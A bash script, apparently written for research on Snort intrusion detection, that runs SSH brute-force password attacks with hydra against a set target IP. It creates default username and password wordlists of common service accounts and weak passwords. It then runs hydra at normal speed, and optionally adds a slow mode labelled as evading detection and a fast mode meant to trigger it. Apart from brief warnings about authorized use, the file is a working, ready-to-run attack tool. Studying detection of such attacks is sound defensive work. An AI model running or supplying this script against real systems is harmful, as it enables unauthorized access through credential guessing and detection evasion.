#!/bin/bash
# SSH Brute Force Attack Script for Academic Research
# WARNING: For educational and authorized testing only

TARGET_IP="192.168.1.100"  # Change to your target IP
TARGET_PORT="22"
WORDLIST_USERS="users.txt"
WORDLIST_PASSWORDS="passwords.txt"
THREADS="4"

echo "SSH Brute Force Testing Script"
echo "=============================="
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "WARNING: This script is for authorized academic research only!"
echo ""

# Create default wordlists if they don't exist
if [[ ! -f "$WORDLIST_USERS" ]]; then
    echo "Creating default user list..."
    cat > "$WORDLIST_USERS" << 'EOF'
root
admin
administrator
test
testuser1
testuser2
user
guest
ftp
service
oracle
postgres
mysql
www
apache
nginx
tomcat
jenkins
git
svn
mail
postfix
nobody
EOF
fi

if [[ ! -f "$WORDLIST_PASSWORDS" ]]; then
    echo "Creating default password list..."
    cat > "$WORDLIST_PASSWORDS" << 'EOF'
password
123456
admin
root
test
guest
user
pass
login
qwerty
abc123
password123
admin123
root123
test123
letmein
welcome
default
service
oracle
postgres
mysql
changeme
password1
admin1
EOF
fi

# Check if hydra is installed
if ! command -v hydra &> /dev/null; then
    echo "Hydra is not installed. Please install it:"
    echo "  sudo apt-get install hydra"
    exit 1
fi

echo "Starting SSH brute force attack..."
echo "Press Ctrl+C to stop"
echo ""

# Run hydra attack
hydra -L "$WORDLIST_USERS" -P "$WORDLIST_PASSWORDS" \
      -t "$THREADS" \
      -vV \
      -f \
      ssh://"$TARGET_IP":"$TARGET_PORT"

echo ""
echo "Attack completed."
echo "Check Snort logs for detection results."

# Alternative attack methods for research
echo ""
echo "Would you like to run additional attack patterns? (y/n)"
read -r response

if [[ "$response" == "y" || "$response" == "Y" ]]; then
    echo ""
    echo "Running slow brute force attack (evade detection)..."
    hydra -L "$WORDLIST_USERS" -P "$WORDLIST_PASSWORDS" \
          -t 1 \
          -w 30 \
          -vV \
          ssh://"$TARGET_IP":"$TARGET_PORT"
    
    echo ""
    echo "Running fast brute force attack (trigger detection)..."
    hydra -L "$WORDLIST_USERS" -P "$WORDLIST_PASSWORDS" \
          -t 16 \
          -vV \
          ssh://"$TARGET_IP":"$TARGET_PORT"
fi

echo ""
echo "SSH brute force testing completed."
echo "Analysis points:"
echo "1. Check Snort alerts for detection"
echo "2. Review SSH logs on target system"
echo "3. Analyze detection timing and accuracy"
echo "4. Compare detection rates between slow and fast attacks"